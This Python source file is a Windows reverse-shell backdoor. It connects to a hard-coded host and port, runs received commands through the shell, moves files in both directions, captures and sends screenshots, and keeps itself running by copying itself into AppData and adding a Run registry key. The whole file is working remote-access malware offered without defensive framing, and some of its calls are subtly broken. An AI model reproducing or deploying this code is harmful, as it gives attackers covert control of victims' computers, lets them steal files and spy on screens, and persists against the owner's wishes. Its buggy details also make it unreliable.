import json
import os
import shutil
import socket
import subprocess
import sys

import manager
import pyautogui
import termcolor


def reliable_send(data):
    """
    Sends data reliably over the network.

    Args:
        data: Data to be sent.

    Returns:
        None
    """
    jsondata = json.dumps(data)
    s.send(jsondata.encode())


def reliable_recv():
    """
    Receives data reliably over the network.

    Returns:
        str: Received data.
    """
    data = ""
    while True:
        try:
            data = data + s.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue


def download_file(file_name):
    """
    Downloads a file from the remote host.

    Args:
        file_name (str): Name of the file to download.

    Returns:
        None
    """
    f = open(file_name, "wb")
    s.settimeout(2)
    chunk = s.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = s.recv(1024)
        except socket.timeout as e:
            break
    s.settimeout(None)
    f.close()


def upload_file(file_name):
    """
    Uploads a file to the remote host.

    Args:
        file_name (str): Name of the file to upload.

    Returns:
        None
    """
    f = open(file_name, "rb")
    s.send(f.read())


def screenshot():
    """
    Takes a screenshot and saves it locally.

    Returns:
        None
    """
    my_screenshot = pyautogui.screenshot()
    my_screenshot.save("screen.png")


def persist(reg_name, copy_name):
    """
    Creates persistence on the target machine.

    Args:
        reg_name (str): Name of the registry key.
        copy_name (str): Name of the copied file.

    Returns:
        None
    """
    file_location = os.environ["appdata"] + "\\" + copy_name
    try:
        if not os.path.exists(file_location):
            shutil.copyfile(sys.executable, file_location)
            subprocess.call(
                "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "
                + reg_name
                + ' /t REG_SZ /d "'
                + file_location
                + '"',
                shell=True,
            )
            reliable_send(
                termcolor.colored("[+] Created Persistence with Reg Key: " + reg_name),
                "green",
                attrs=["bold"],
            )
        else:
            reliable_send(
                termcolor.colored(
                    "[+] Persistence Already Exists", "green", attrs=["bold"]
                )
            )
    except:
        reliable_send(
            termcolor.colored("[+] Error Creating Persistence with the target machine"),
            "red",
            attrs=["bold"],
        )


def shell():
    """
    Initiates the command shell for communication with the remote host.

    Returns:
        None
    """
    while True:
        command = reliable_recv()
        if command == "quit":
            break
        elif command == "help":
            pass
        elif command == "clear":
            pass
        elif command == "cd":
            os.system("cd")
        elif command[:3] == "cd ":
            os.chdir(command[3:])
        elif command[:6] == "inject":
            download_file(command[7:])
        elif command[:8] == "download":
            upload_file(command[9:])
        elif command[:10] == "screenshot":
            screenshot()
            upload_file("screen.png")
            os.remove("screen.png")
        elif command[:11] == "persistence":
            reg_name, copy_name = command[:12].split(" ")
            persist(reg_name, copy_name)

        else:
            execute = subprocess.Popen(
                command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                stdin=subprocess.PIPE,
            )
            result = execute.stdout.read() + execute.stderr.read()
            result = result.decode()
            reliable_send(result)


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.0.5", 5555))
shell()
